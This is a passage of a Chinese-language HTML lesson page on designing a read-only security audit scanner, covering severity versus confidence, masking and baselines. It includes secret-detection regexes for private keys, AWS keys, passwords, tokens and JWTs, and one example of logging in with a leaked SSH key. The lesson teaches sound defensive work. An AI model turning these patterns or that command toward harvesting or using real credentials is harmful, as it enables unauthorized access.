@@ -1,0 +1,1461 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Day 159 — 安全审计工具：扫描器设计 · 报告生成 · CLI 整合</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body class="lesson">
+<a class="skip" href="#content">跳到正文</a>
+
+<header class="lhead">
+  <a class="back" href="../index.html">← 返回总目录</a>
+  <h1>Day 159 — 安全审计工具：扫描器设计 · 报告生成 · CLI 整合</h1>
+  <div class="lmeta">
+    <span class="badge">网络安全开发</span>
+    <span class="badge">1195 行</span>
+    <span class="badge">4 个可运行脚本</span>
+    <div class="pills"><a class="pill-link" href="code/" download>📦 下载本课代码（4 个文件）</a><a class="pill-link" href="exercises.html">✍️ 练习与清单</a><a class="pill-link" href="diagrams.html">🗺️ 图解</a><a class="pill-link" href="https://github.com/Geek0ne/Python-200-days/tree/main/days/day-159-security-audit-toolkit" rel="noopener">📁 GitHub 源文件</a></div>
+  </div>
+</header>
+
+<div class="lwrap">
+  <nav class="toc" aria-label="目录">
+    <div class="toc-h">本页目录</div>
+    <a class="toc-l2" href="#1">1. 学习目标</a>
+<a class="toc-l2" href="#2">2. 概念解释</a>
+<a class="toc-l3" href="#21-security-audit">2.1 什么是安全审计（Security Audit）</a>
+<a class="toc-l3" href="#22">2.2 扫描器的五个组成部分</a>
+<a class="toc-l3" href="#23">2.3 严重度 ≠ 置信度（本课最重要的一个概念）</a>
+<a class="toc-l3" href="#24-coverage-gap">2.4 覆盖缺口（coverage gap）</a>
+<a class="toc-l2" href="#3">3. 原理解释</a>
+<a class="toc-l3" href="#31-why-remediation">3.1 为什么规则必须携带 why 和 remediation</a>
+<a class="toc-l3" href="#32">3.2 为什么&quot;脱敏&quot;要在数据结构层做，而不是打印时做</a>
+<a class="toc-l3" href="#33">3.3 为什么审计工具必须是只读的</a>
+<a class="toc-l3" href="#34">3.4 为什么必须自限资源</a>
+<a class="toc-l3" href="#35-baseline">3.5 为什么 baseline 抑制必须&quot;可见&quot;</a>
+<a class="toc-l3" href="#36">3.6 为什么&quot;误报&quot;是这类工具的固有属性</a>
+<a class="toc-l2" href="#4">4. 攻击方式 · 手段 · 原理 → 检测原理</a>
+<a class="toc-l3" href="#40">4.0 总纲：规则不是漏洞，特征不是结论</a>
+<a class="toc-l3" href="#41-secret_private_keycriticalhigh">4.1 secret_private_key（critical/high）— 私钥误提交</a>
+<a class="toc-l3" href="#42-secret_cloud_access_keycriticalhigh-access-key">4.2 secret_cloud_access_key（critical/high）— 云 Access Key 泄露</a>
+<a class="toc-l3" href="#43-secret_hardcoded_credentialhighmedium-token">4.3 secret_hardcoded_credential（high/medium）— 硬编码口令 / Token</a>
+<a class="toc-l3" href="#44-secret_bearer_jwtmediummedium-jwt">4.4 secret_bearer_jwt（medium/medium）— 硬编码 JWT</a>
+<a class="toc-l3" href="#45-config_debug_enabledmediumhigh-debug">4.5 config_debug_enabled（medium/high）— 生产开启 DEBUG</a>
+<a class="toc-l3" href="#46-tls_verify_disabledhighhigh-tls">4.6 tls_verify_disabled（high/high）— 关闭 TLS 证书校验</a>
+<a class="toc-l3" href="#47-tls_legacy_protocolmediumhigh-tlsssl">4.7 tls_legacy_protocol（medium/high）— 启用过时 TLS/SSL</a>
+<a class="toc-l3" href="#48-weak_hash_or_cipherlowlow">4.8 weak_hash_or_cipher（low/low）— 弱哈希 / 弱算法</a>
+<a class="toc-l3" href="#49-shell_exec_enabledmediumhigh-shelltrue">4.9 shell_exec_enabled（medium/high）— shell=True 的注入面</a>
+<a class="toc-l3" href="#410-dynamic_evalmediumlow-eval-exec">4.10 dynamic_eval（medium/low）— eval / exec</a>
+<a class="toc-l3" href="#411-world_writable_chmodhighmedium">4.11 world_writable_chmod（high/medium）— 授权过宽的文件权限</a>
+<a class="toc-l3" href="#412-insecure_package_indexmediumhigh-http">4.12 insecure_package_index（medium/high）— 明文 HTTP 软件源与供应链投毒</a>
+<a class="toc-l3" href="#413-unpinned_dependencylowmedium">4.13 unpinned_dependency（low/medium）— 依赖未锁定版本</a>
+<a class="toc-l3" href="#414-13">4.14 误报的来源分类与处置原则（13 条对照）</a>
+<a class="toc-l2" href="#5">5. 核心机制详解</a>
+<a class="toc-l3" href="#51">5.1 引擎执行流程</a>
+<a class="toc-l3" href="#52-13">5.2 规则库（13 条，四类）</a>
+<a class="toc-l3" href="#53">5.3 匹配的粒度与去重</a>
+<a class="toc-l3" href="#54">5.4 覆盖统计字段</a>
+<a class="toc-l3" href="#55">5.5 报告的三层结构</a>
+<a class="toc-l3" href="#56">5.6 门禁退出码</a>
+<a class="toc-l3" href="#57">5.7 快速开始</a>
+<a class="toc-l2" href="#6-api">6. 定义与使用方法（API 速查）</a>
+<a class="toc-l3" href="#61">6.1 数据结构</a>
+<a class="toc-l3" href="#62">6.2 函数速查</a>
+<a class="toc-l3" href="#63-02-report-builderpy">6.3 报告层函数（02-report-builder.py）</a>
+<a class="toc-l3" href="#64-cli-03-audit-toolkitpy">6.4 CLI 速查（03-audit-toolkit.py）</a>
+<a class="toc-l3" href="#65-baseline">6.5 baseline 文件格式</a>
+<a class="toc-l2" href="#7">7. 运行命令 + 真实预期输出（实测）</a>
+<a class="toc-l3" href="#70">7.0 准备</a>
+<a class="toc-l3" href="#71-self-test-ok">7.1 三个脚本的自检（必跑，必须逐行输出 SELF-TEST OK）</a>
+<a class="toc-l3" href="#72">7.2 规则库</a>
+<a class="toc-l3" href="#73">7.3 基础示例：内存样本 → 命中表</a>
+<a class="toc-l3" href="#74">7.4 报告生成：覆盖不全时，声明必须排在明细之前</a>
+<a class="toc-l3" href="#75-lab">7.5 端到端演示：lab（临时目录搭建 → 扫描 → 退出码）</a>
+<a class="toc-l3" href="#76-json">7.6 扫描你自己的项目 → JSON 中间产物 → 重新渲染</a>
+<a class="toc-l3" href="#77">7.7 退出码实测对照</a>
+<a class="toc-l2" href="#8">8. 实战流程（六步）</a>
+<a class="toc-l2" href="#9">9. 常见陷阱（对照表）</a>
+<a class="toc-l2" href="#10">10. 局限（必须写进报告，不能省略）</a>
+<a class="toc-l2" href="#11">11. 思考题</a>
+  </nav>
+  <main id="content" class="lbody">
+<h1 id="day-159-cli">Day 159 — 安全审计工具：扫描器设计 · 报告生成 · CLI 整合</h1>
+<blockquote>
+<p><strong>Phase 10 — 网络安全开发（Day 146–165）</strong> · 主题：安全审计工具（实战）</p>
+<p><strong>使用边界（重要）</strong>：本课的工具只用于<strong>你自己拥有或已获书面授权</strong>的本地目录<br>
+（自己的项目、离线副本、授权仓库）。工具箱是<strong>只读</strong>的：不修改、不删除被审计<br>
+文件，<strong>不发起任何网络请求</strong>，不尝试利用任何"疑似漏洞"。它检查的是<br>
+<strong>配置与代码中的已知风险模式</strong>，输出的<strong>复核线索</strong>，不是"漏洞结论"。<br>
+样本中的凭据全部是公开示例值或占位符。</p>
+</blockquote>
+<h2 id="1">1. 学习目标</h2>
+<p>完成本课后，你应该能够：</p>
+<ul>
+<li>说清<strong>安全审计 / 漏洞扫描 / 渗透测试</strong>三者的边界，知道本工具属于哪一类</li>
+<li>设计一个扫描器的五个组成部分：目标模型、规则模型、引擎、结果模型、报告模型</li>
+<li>区分<strong>严重度（impact）</strong>与<strong>置信度（certainty）</strong>，并能用 <code>priority</code> 排序复核队列</li>
+<li>让报告<strong>不可能</strong>泄露明文凭据（结构性脱敏，而不是"记得脱敏"）</li>
+<li>让工具<strong>如实声明覆盖缺口</strong>，而不是用"0 命中"冒充"安全"</li>
+<li>把扫描结果接进 CI：理解退出码 0/2/3/4 的语义与优先级</li>
+<li>用 <code>baseline</code> 治理误报，同时保证抑制项<strong>可见、可审计、可复查</strong></li>
+</ul>
+<h2 id="2">2. 概念解释</h2>
+<h3 id="21-security-audit">2.1 什么是安全审计（Security Audit）</h3>
+<p>安全审计是<strong>以既定基线为准绳，系统性收集证据、比对差异、输出可复核结论</strong>的过程。<br>
+它的产物是"证据 + 判断 + 建议"，不是"感觉安全"。</p>
+<p>三个容易混淆的概念，边界必须清楚：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>做什么</th>
+<th>有无副作用</th>
+<th>典型产物</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>安全审计 (audit)</strong></td>
+<td>对照基线检查配置/代码/权限，收集证据</td>
+<td>只读</td>
+<td>审计报告、复核线索、整改项</td>
+</tr>
+<tr>
+<td><strong>漏洞扫描 (scan)</strong></td>
+<td>用规则批量匹配已知问题模式</td>
+<td>只读（本课）或轻探测</td>
+<td>命中清单 + 分级</td>
+</tr>
+<tr>
+<td><strong>渗透测试 (pentest)</strong></td>
+<td>主动利用漏洞验证影响</td>
+<td><strong>有副作用</strong>，需授权与窗口</td>
+<td>利用证据、影响评估</td>
+</tr>
+</tbody>
+</table>
+<p>本课实现的是<strong>审计/扫描</strong>：读文件、匹配规则、出报告。它<strong>没有</strong>发送请求、<br>
+没有尝试登录、没有验证漏洞是否真能被利用——这也是它能安全地跑在<br>
+任何一台机器上的原因。</p>
+<h3 id="22">2.2 扫描器的五个组成部分</h3>
+<p>一个能长期维护的扫描器，一定把这五件事分开（而不是写成一个 500 行的脚本）：</p>
+<pre class="plain"><code>Target  →  Rule  →  Engine  →  Finding  →  Report
+目标     规则      引擎       结果        报告
+</code></pre>
+<ul>
+<li><strong>Target（目标模型）</strong>：扫什么？目录 or 单文件；哪些目录是黑名单。<br>
+  默认不扫全盘：越权扫描既危险又制造噪声。</li>
+<li><strong>Rule（规则模型）</strong>：检查什么？每条规则 = <code>id + 严重度 + 置信度 + why + remediation</code>。</li>
+<li><strong>Engine（引擎）</strong>：怎么扫？遍历策略、单文件大小上限、文件数上限、异常处理。</li>
+<li><strong>Finding（结果模型）</strong>：证据怎么存？位置 + 脱敏后的证据 + 指纹 + 修复建议。</li>
+<li><strong>Report（报告模型）</strong>：给谁看？JSON 给机器、Markdown 给人、摘要与退出码给 CI。</li>
+</ul>
+<h3 id="23">2.3 严重度 ≠ 置信度（本课最重要的一个概念）</h3>
+<pre class="plain"><code>严重度 severity   = 这个风险一旦被利用，影响有多大      （客观、与检测方式无关）
+置信度 confidence = 这条命中真的是问题的把握有多大      （取决于匹配方式）
+</code></pre>
+<p>例子：正则匹配到 <code>MD5</code>（弱算法）—— 影响力有限，而且"它在密码学用途还是<br>
+缓存键用途"根本看不出来 → <code>severity=low, confidence=low</code>。<br>
+而匹配到 <code>AKIA</code> 开头的 Access Key —— 影响极大，且这个前缀形态极其确定<br>
+→ <code>severity=critical, confidence=high</code>。</p>
+<p><strong>为什么必须分开？</strong> 因为处置方式完全不同：</p>
+<ul>
+<li>高影响 + 低把握 → 必须<strong>先去验证</strong>（不能直接派修，那会造成大量无效工单）</li>
+<li>低影响 + 高把握 → <strong>排期修</strong>（确定性高，但不紧急）</li>
+</ul>
+<p>如果只有一个"危险等级"字段，这两类会被塞进同一个队列，<br>
+结果是复核人员被噪音淹没，真正的高危反而被淹没在第 30 条之后。</p>
+<p><code>priority = (severity+1) × (confidence+1)</code>（1..15），分档 <code>P0/P1/P2/P3</code>。<br>
+用乘法是因为它天然表达"任一维很低都会拉低优先级"，而加法做不到。</p>
+<h3 id="24-coverage-gap">2.4 覆盖缺口（coverage gap）</h3>
+<p>扫描器<strong>永远</strong>会漏东西：文件太大跳过、二进制不解析、编码不对读不了、<br>
+符号链接不跟进、达到文件数上限截断、权限不足读失败……</p>
+<p>这些不是"边缘情况"，而是<strong>报告可信度的边界</strong>。因此：</p>
+<ul>
+<li>所有跳过与错误都要计数（<code>Coverage.skipped</code> / <code>Coverage.errors</code> / <code>truncated</code>）</li>
+<li>只要有任何一项非空，<code>Coverage.complete == False</code></li>
+<li>此时报告<strong>必须</strong>在显眼位置声明缺口，并且<strong>不得</strong>出现"未发现问题"的结论</li>
+</ul>
+<p>一句话：<strong>"扫描 0 命中"只有在覆盖完整时才是有意义的信息。</strong></p>
+<h2 id="3">3. 原理解释</h2>
+<h3 id="31-why-remediation">3.1 为什么规则必须携带 <code>why</code> 和 <code>remediation</code></h3>
+<p>一个只给出 <code>rule_id</code> 的报告，对复核人员来说就是一封没有落款的举报信：<br>
+他知道"有东西不对"，但不知道"为什么不对、下一步做什么"。</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">Rule</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;tls_verify_disabled&quot;</span><span class="p">,</span> <span class="o">...</span><span class="p">,</span> <span class="n">why</span><span class="o">=</span><span class="s2">&quot;verify=False 让中间人攻击变得平凡，加密只剩心理安慰作用&quot;</span><span class="p">,</span>
+     <span class="n">remediation</span><span class="o">=</span><span class="s2">&quot;恢复校验；如为自签名证书，改为显式配置受信任的 CA 包&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>规则库因此是<strong>知识的载体</strong>，不是一堆正则。这也解释了为什么规则要有<br>
+<code>cwe</code> 字段：它让不同工具的结果可以互相映射（同一问题在不同扫描器里<br>
+叫什么名字不重要，CWE-295 只有一个）。</p>
+<h3 id="32">3.2 为什么"脱敏"要在数据结构层做，而不是打印时做</h3>
+<p>事故链是这样的：<code>原始行 → Finding 对象 → 某人加了 --debug → 明文进 CI 日志</code>。<br>
+只要<strong>明文曾经存在于结果对象里</strong>，就总有一天会漏出去。</p>
+<p>所以本课的实现是：</p>
+<ul>
+<li><code>Finding</code> <strong>没有</strong> <code>raw</code> 字段（结构上不存在）</li>
+<li><code>make_finding()</code> 只写入 <code>masked</code>（前 4 位 + 星号，超长截断）与 <code>evidence_sha256</code></li>
+<li><code>mask()</code> 保留前 4 位的理由：可以在日志/配置里<strong>定位</strong>到它（<code>AKIA</code>、<code>eyJ</code>、<code>sk-</code>）</li>
+<li>指纹用于跨报告比对"是不是同一个值"，但不可还原</li>
+</ul>
+<p>这就是"让事故在结构上不可能发生"，而不是"靠纪律避免"。</p>
+<h3 id="33">3.3 为什么审计工具必须是只读的</h3>
+<p>因为<strong>发现问题的组件不应该有权处置问题</strong>。</p>
+<p>如果扫描器能自动 <code>chmod</code> / 自动删除"疑似后门"，那么一次误报就会变成<br>
+一次生产事故；而误报在模式匹配类工具里是<strong>必然存在</strong>的（见 3.6）。<br>
+把权限切开之后，误报的代价最多是一条无效工单。</p>
+<p>工程上具体表现为：<code>scan_path()</code> 只调用 <code>read_bytes()</code><br>
+（读文件、不写、不改权限、不发网络请求），<code>lab</code> 子命令的一切写入都发生在<br>
+<code>tempfile.TemporaryDirectory()</code> 里，退出即清理。</p>
+<h3 id="34">3.4 为什么必须自限资源</h3>
+<p>审计脚本跑在别人的机器上（CI runner、同事的笔记本、生产跳板机）。<br>
+没有上限的扫描会把对方拖死，而"我们的审计工具让生产变慢了"是最容易<br>
+被卸载的工具。三条硬上限：</p>
+<table>
+<thead>
+<tr>
+<th>上限</th>
+<th>默认</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>max_bytes</code></td>
+<td>1 MiB / 文件</td>
+<td>不读巨型日志/数据库导出</td>
+</tr>
+<tr>
+<td><code>max_files</code></td>
+<td>1000 / 次</td>
+<td>达到上限即 <code>truncated=True</code>，报告声明截断</td>
+</tr>
+<tr>
+<td><code>exclude_dirs</code></td>
+<td><code>.git</code> <code>node_modules</code> <code>__pycache__</code> <code>.venv</code> …</td>
+<td>排除巨型无关目录</td>
+</tr>
+</tbody>
+</table>
+<p>注意 <code>truncated</code> 属于<strong>覆盖缺口</strong>：静默截断比慢更危险。</p>
+<h3 id="35-baseline">3.5 为什么 baseline 抑制必须"可见"</h3>
+<p>误报是模式匹配的固有问题（见 3.6），所以必须有 <code>baseline</code>。但直接<br>
+"过滤掉命中"会让 baseline 退化成永久消音器：没人知道我们接受过多少风险。</p>
+<p>本课的做法：命中的条目<strong>不删除</strong>，移入 <code>report.suppressed</code> 并单独计数，<br>
+Markdown 报告里单独一节列出（规则 + 位置 + 严重度），并写明<br>
+"抑制 ≠ 修复，请在评审记录中说明原因与复查日期"。</p>
+<p><code>baseline</code> 文件本身也应该进版本控制：它是一张需要评审、需要定期复查的<br>
+风险接受清单（<code>#</code> 开头为注释，支持 <code>rule:path</code> 与 <code>rule:sha256</code> 两种键）。</p>
+<h3 id="36">3.6 为什么"误报"是这类工具的固有属性</h3>
+<p>规则是"模式"，模式匹配不看上下文。三个只靠正则无法回答的问题：</p>
+<ol>
+<li><strong>用途</strong>：<code>md5(...)</code> 是给密码哈希用，还是给缓存键用？</li>
+<li><strong>数据流</strong>：<code>eval(expr)</code> 的 <code>expr</code> 是常量，还是外部输入？</li>
+<li><strong>上下文</strong>：文档/注释里提到 <code>password = "..."</code>，算不算凭据？</li>
+</ol>
+<p>所以本课的规则里，凡是有歧义的都给<strong>低置信度</strong>（<code>weak_hash_or_cipher</code>、<br>
+<code>dynamic_eval</code>），而形态极其确定的（私钥 PEM 头、云 Access Key 前缀）<br>
+才给高置信度。此外，<code>docs/notes.md</code> 这类文档命中是<strong>故意保留</strong>的样本——<br>
+它演示了误报的真实形态，也是练习 6 的对象。</p>
+<h2 id="4">4. 攻击方式 · 手段 · 原理 → 检测原理</h2>
+<h3 id="40">4.0 总纲：规则不是漏洞，特征不是结论</h3>
+<p>本课 13 条规则全部是<strong>模式匹配</strong>。要把它们用对，必须先看清从"真实风险"到"一条命中"之间衰减了四次：</p>
+<pre class="plain"><code>① 风险形态            ② 影响链            ③ 可观测特征                        ④ 规则                命中
+&quot;私钥跟着代码走&quot;   →  &quot;身份不可回滚&quot;   →  &quot;-----BEGIN ... PRIVATE KEY-----&quot;  → secret_private_key  → 复核线索
+</code></pre>
+<ul>
+<li>①→③ <strong>有损</strong>：很多同等重要的风险在文件里<strong>没有稳定字符串</strong>（弱随机数、目录权限、错误的 CORS 配置、业务逻辑缺陷），所以本课<strong>不写</strong>这类规则，而不是硬凑一条正则。</li>
+<li>③→④ <strong>有损</strong>：正则写宽了误报、写窄了漏报，两者不可兼得（见 4.14）。</li>
+<li>④→命中 <strong>必然含误报</strong>：模式不看用途、不看数据流、不看上下文。</li>
+</ul>
+<p>下面每一节都按同一个模版展开：<strong>真实风险形态 → 影响链 → 可观测特征 → 规则靠什么识别 → 为什么会误报</strong>。所有描述都针对本地/自建环境，可复现、无外部目标。</p>
+<hr>
+<h3 id="41-secret_private_keycriticalhigh">4.1 <code>secret_private_key</code>（critical/high）— 私钥误提交</h3>
+<p><strong>真实风险形态</strong></p>
+<ul>
+<li>把 <code>~/.ssh/id_rsa</code> 拷进项目目录以便"自动化脚本用"，随手 <code>git add .</code>；</li>
+<li>把 <code>cert.pem</code> / <code>key.pem</code> 放进 <code>certs/</code>、<code>ids/</code>、<code>deploy/</code> 并提交；</li>
+<li>私钥粘贴进 Ansible / Helm / CI 的明文变量，或写进 <code>.env</code>；</li>
+<li>变体：私钥被 base64 或 <code>\n</code> 转义后塞进 <code>.env</code>；被 <code>COPY . /app</code> 打进 Docker 镜像层。</li>
+</ul>
+<p><strong>影响链（为什么它比"口令泄露"更严重）</strong></p>
+<ol>
+<li>私钥是<strong>身份本身</strong>，不是"用来换身份的凭据"。多数场景下它<strong>没法改</strong>——你只能换一把新钥匙，所以处置动作永远是"<strong>轮换</strong>"，而不是"从仓库删掉"。</li>
+<li><code>git rm</code> 只删掉最新一次提交；<code>git log -p</code>、远端 fork、CI 缓存、同事的 clone、镜像层里都还在。<strong>历史不可回滚</strong>，这是它 severity 直接给 <code>critical</code> 的原因。</li>
+<li>若私钥<strong>没设口令短语（passphrase）</strong>，利用成本为零：<code>ssh -i leaked.key user@host</code> 直接进。设了口令短语也只是把"零成本"变成"离线爆破成本"，弱短语在现代硬件上是分钟级。</li>
+<li>影响面取决于这把钥匙被授权去哪：跳板机、Git 服务、云主机、K8s、VPN 常常共用同一把。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p>PEM 的私钥封装格式是<strong>协议规定</strong>的（RFC 7468），不是约定俗成，所以首行极其稳定：</p>
+<pre class="plain"><code>-----BEGIN RSA PRIVATE KEY-----        传统 OpenSSL RSA
+-----BEGIN OPENSSH PRIVATE KEY-----    OpenSSH 新格式（ssh-keygen 默认）
+-----BEGIN EC PRIVATE KEY-----         ECDSA
+-----BEGIN DSA PRIVATE KEY-----        历史遗留
+-----BEGIN PRIVATE KEY-----            PKCS#8（通用，也覆盖 Ed25519）
+-----BEGIN ENCRYPTED PRIVATE KEY-----  带口令短语的 PKCS#8
+</code></pre>
+<p><strong>一行就足以判定</strong>：不需要看长度、不需要看第二行（真正的密钥体是长 base64 行，反而不好匹配）。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----&quot;</span>
+</code></pre></div>
+<p><code>[A-Z0-9 ]*</code> 一口气吃掉 <code>RSA</code> / <code>OPENSSH</code> / <code>EC</code> / <code>DSA</code> / <code>ENCRYPTED</code> 等全部前缀变体，一条正则覆盖所有算法。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>文档/教程里贴了示例私钥（本课 <code>ids/private.pem</code> 就是这么一份<strong>教学占位符</strong>，内容是 <code>PLACEHOLDER-NOT-A-REAL-KEY</code>）；</li>
+<li>测试夹具里放了<strong>已吊销/不可用</strong>的密钥。</li>
+</ul>
+<p>所以给 <code>high</code> 而不是"确定"：<strong>"这是一段私钥" ≠ "这把私钥仍然有效"</strong>。吊销状态、授权范围、是否曾离开可信边界，全都需要人工确认——这正是报告只输出"线索"的原因。</p>
+<hr>
+<h3 id="42-secret_cloud_access_keycriticalhigh-access-key">4.2 <code>secret_cloud_access_key</code>（critical/high）— 云 Access Key 泄露</h3>
+<p><strong>真实风险形态</strong></p>
+<ul>
+<li>为了"先跑通 demo"，把云 API 的长期 Access Key 写成脚本常量（<code>AKIA...</code>）；</li>
+<li>把 Key 写进 <code>.env</code> 并提交，以为"<code>.env</code> 不会被提交"（<code>.gitignore</code> 往往是事后才补的）；</li>
+<li>把 Key 写进 Dockerfile 的 <code>ENV</code>、写进前端构建变量、写进移动端里能被反编译出来的字符串。</li>
+</ul>
+<p><strong>影响链</strong></p>
+<p>长期 Access Key（非 STS 临时凭据）默认<strong>不会自动过期</strong>，且常常绑定过宽权限。拿到它的人可以做：</p>
+<ol>
+<li>开矿机 / 跑批量任务 → <strong>账单事故</strong>（最早的公开案例就是账单爆炸）；</li>
+<li>读对象存储全量数据 → 数据泄露；</li>
+<li>改/删资源 → 可用性事故；</li>
+<li>提权：从"能建实例"到"能在实例上执行代码"，进而摸到实例上的其它凭据。</li>
+</ol>
+<p>关键点：<strong>云的签名机制不依赖源 IP</strong>。Key 一旦离开你的边界，攻击者在自己家里就能用，你的日志里只会留下"来自某个陌生 IP 的 API 调用"。</p>
+<p><strong>可观测特征</strong></p>
+<p>AWS Access Key ID 有固定形态：前缀 <code>AKIA</code>（长期凭据）+ 16 位大写字母数字，共 20 字符。其它云也都有前缀特征（本课只内置 AWS 形态，其余按业务补规则）。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\bAKIA[0-9A-Z]</span><span class="si">{16}</span><span class="s2">\b&quot;</span>
+</code></pre></div>
+<p>两端的 <code>\b</code> 保证不会把更长随机串中间的一段误当成 Key。</p>
+<p><strong>为什么会误报</strong></p>
+<p><code>AKIAIOSFODNN7EXAMPLE</code> 是 <strong>AWS 官方文档的标准示例值</strong>（本课样本用的正是它）。它长得完全合法，但永远无效。这类"文档示例值"是所有前缀型规则的固定噪声源——<strong>不能靠改规则消除</strong>，只能靠复核 + baseline（见 6.5）。</p>
+<hr>
+<h3 id="43-secret_hardcoded_credentialhighmedium-token">4.3 <code>secret_hardcoded_credential</code>（high/medium）— 硬编码口令 / Token</h3>
+<p><strong>真实风险形态</strong></p>
+<ul>
+<li><code>DB_PASSWORD = "..."</code>、<code>SMTP_PASSWORD = "..."</code>、<code>JWT_SECRET = "..."</code>；</li>
+<li><code>API_KEY = "..."</code> / <code>apikey: "..."</code>；</li>
+<li>被当成"配置"写进源码的 token、被写进测试脚本的运维口令。</li>
+</ul>
+<p><strong>影响链（为什么它和"放在环境变量里"有本质区别）</strong></p>
+<ol>
+<li><strong>不可按人回收</strong>：环境变量/密钥服务可以按实例、按角色下发并单独撤销；硬编码口令是<strong>一份明文复制到所有人的电脑、所有备份、所有 CI 缓存</strong>。任何一个人离职，你都无法确认他手上还有多少份副本。</li>
+<li><strong>随产物扩散</strong>：打包进 Wheel/sdist、打进镜像层、进前端 bundle、进移动端 APK——<strong>发布即泄露</strong>，而且无法"召回"。</li>
+<li><strong>历史不可回滚</strong>：与私钥同理。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p>赋值形态：<code>&lt;关键词&gt; [: 或 =] &lt;引号包裹的值&gt;</code>，关键词是 <code>password/passwd/secret/token/api_key/apikey</code>，值在引号内长度 ≥ 6。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;(?i)(password|passwd|secret|token|api_key|apikey)\s*[:=]\s*[</span><span class="se">\&quot;</span><span class="s2">&#39;][^</span><span class="se">\&quot;</span><span class="s2">&#39;\s]{6,}[</span><span class="se">\&quot;</span><span class="s2">&#39;]&quot;</span>
+</code></pre></div>
+<p><strong>为什么用 <code>(?i)</code> 但不加 <code>\b</code>（真实踩过的坑）</strong></p>
+<p>最容易漏掉的是 <code>DB_PASSWORD</code>、<code>REDIS_PASSWORD</code> 这种<strong>下划线前缀</strong>写法。如果写成 <code>\bpassword\b</code>，<code>_</code> 在正则里属于单词字符（<code>\w</code>），所以 <code>DB_PASSWORD</code> 中 <code>password</code> 前后<strong>都没有单词边界</strong>，规则会<strong>直接漏掉最常见的一种写法</strong>。本课因此刻意不加 <code>\b</code>，改用 <code>[:=]</code> + 引号来限定形态，把噪声交给置信度处理。</p>
+<p><strong>为什么会误报（medium 置信度的来源）</strong></p>
+<ol>
+<li><strong>值是占位符</strong>：<code>password = "example-value"</code>、<code>"ChangeMe"</code>、<code>"your-password-here"</code>（本课 <code>docs/notes.md</code> 就是这种，被<strong>故意保留</strong>作为误报样本）；</li>
+<li><strong>关键词是普通变量</strong>：<code>token = "completed"</code> 这类"状态字符串"也会命中；</li>
+<li><strong>模板/示例配置</strong>：故意写成 <code>password = "..."</code> 的脚手架文件。</li>
+</ol>
+<p>这就是"高影响 + 中等把握"的典型：<strong>必须人工看一眼才能派修</strong>，否则会产生大量无效工单。</p>
+<hr>
+<h3 id="44-secret_bearer_jwtmediummedium-jwt">4.4 <code>secret_bearer_jwt</code>（medium/medium）— 硬编码 JWT</h3>
+<p><strong>真实风险形态</strong></p>
+<p>把联调时抓到的会话 Token 直接写进脚本 / 前端 / Postman 集合并提交；把长期有效的服务账号 JWT 写进配置。</p>
+<p><strong>影响链</strong></p>
+<p>JWT 是<strong>可用凭据</strong>（Bearer Token），写进代码等于把会话借给所有能读到代码的人。危害边界取决于三件事：<strong>是否过期、是否可撤销、内含什么声明（scope）</strong>。长期、不可撤销、scope 宽的服务 Token，危害接近 API Key。</p>
+<p><strong>可观测特征</strong></p>
+<p>JWT 是 <code>base64url(header).base64url(payload).base64url(signature)</code>，而 JSON 的 base64url 编码<strong>固定以 <code>eyJ</code> 开头</strong>（<code>{"</code> 的编码）。所以"三段式 + <code>eyJ</code> 前缀"是稳定特征。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}\b&quot;</span>
+</code></pre></div>
+<p>三段长度下限刻意放宽（8/8/4），因为某些算法的签名段很短。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>文档/博客里贴的<strong>已过期</strong>示例 Token；</li>
+<li>测试夹具里<strong>自签且只对本地生效</strong>的 Token；</li>
+<li>极少数非 JWT 的 <code>eyJ</code> 开头 base64url 串（概率低但存在）。</li>
+</ul>
+<hr>
+<h3 id="45-config_debug_enabledmediumhigh-debug">4.5 <code>config_debug_enabled</code>（medium/high）— 生产开启 DEBUG</h3>
+<p><strong>真实风险形态</strong></p>
+<p>框架默认配置里 <code>DEBUG = True</code> 忘了改；用同一份配置跑 dev/prod；<code>DEBUG = True</code> 被写进容器镜像的默认环境变量。</p>
+<p><strong>影响链</strong></p>
+<p>不同框架后果不同，但共同点是<strong>面向攻击者的信息增强</strong>：</p>
+<ul>
+<li>Django / Flask：<code>DEBUG=True</code> 触发详细错误页，泄露源码片段、settings 全文、环境变量、数据库 DSN；Django 在 DEBUG 下还会暴露路由表等信息；</li>
